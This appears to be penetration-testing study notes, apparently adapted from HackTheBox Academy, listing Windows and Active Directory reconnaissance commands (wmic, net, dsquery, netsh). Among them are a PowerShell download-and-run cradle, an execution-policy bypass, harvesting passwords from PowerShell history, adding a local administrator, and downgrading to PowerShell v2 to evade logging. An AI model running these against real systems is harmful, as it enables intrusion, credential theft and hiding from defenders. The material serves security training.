
# Environment Commands For Host & Network Recon

#### Basic Enumeration Commands

|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).

#### Systeminfo

![image](https://academy.hackthebox.com/storage/modules/143/systeminfo.png)


## Harnessing PowerShell

PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

Let's look at a few of the ways PowerShell can help us.

Harnessing PowerShell
PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

Let's look at a few of the ways PowerShell can help us.
```powershell


Cmd-Let	Description

Get-Module	Lists available modules loaded for use.


Get-ExecutionPolicy -List	  Will print the execution policy settings for each scope on a host.


Set-ExecutionPolicy Bypass -Scope Process	    This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.


Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	                 With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.

Get-ChildItem Env: | ft Key,Value	                              Return environment values such as key paths, users, computer information, etc.

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"


We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

Downgrade Powershell
  Downgrade Powershell
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2


```



With [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.




**Checking Defenses**
*The next few commands utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.*


**Firewall Checks**
```powershell
netsh advfirewall show allprofiles
```

**Windows Defender check CMD.exe**
```cmd

C:\htb> sc query windefend
```

Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.
Get-MpComputerStatus

```powershell-session
PS C:\htb> Get-MpComputerStatus
```
#### Using qwinsta

  Using qwinsta

```powershell-session
PS C:\htb> qwinsta
```



### Networking Information
|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show state`|



### Windows Management Instrumentation(WMI)

|   |   |
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|


```powershell
net accounts    Infor about password requirements

net accounts /domain   Password and lockout policy


net group /domain

net group "Domain Admins" /domain   List users with domain admin privileges


net group "domain computers" /domain   List of PCs connected to the domain


net group "Domain Controllers" /domain	List PC accounts of domains controllers

net group <domain_group_name> /domain	User that belongs to the group

net groups /domain	List of domain groups

net localgroup	All available groups

net localgroup administrators /domain	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)


net localgroup Administrators	Information about a group (admins)


net localgroup administrators [username] /add	Add user to administrators

net share	Check current shares

net user <ACCOUNT_NAME> /domain	Get information about a user within the domain

net user /domain	List all users of the domain

net user %username%	Information about the current user

net use x: \computer\share	Mount the share locally

net view	Get a list of computers


net view /all /domain[:domainname]	Shares on the domains

net view \computer /ALL	List shares of a computer

net view /domain	List of PCs of the domain

```


#### Information about a Domain User

  Information about a Domain User

```powershell-session
PS C:\htb> net user /domain wrouse
```


#### Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

#### User Search

  User Search

```powershell-session
PS C:\htb> dsquery user
```

#### Computer Search

  Computer Search

```powershell-session
PS C:\htb> dsquery computer
```


We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)) to view all objects in an OU, for example.

#### Wildcard Search

  Wildcard Search

```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```


We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

#### Users With Specific Attributes Set (PASSWD_NOTREQD)

  Users With Specific Attributes Set (PASSWD_NOTREQD)

```powershell-session
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

```


#### Searching for Domain Controllers

  Searching for Domain Controllers

```powershell-session
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

```


#### Logical Operators

When building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:  
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:  
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`




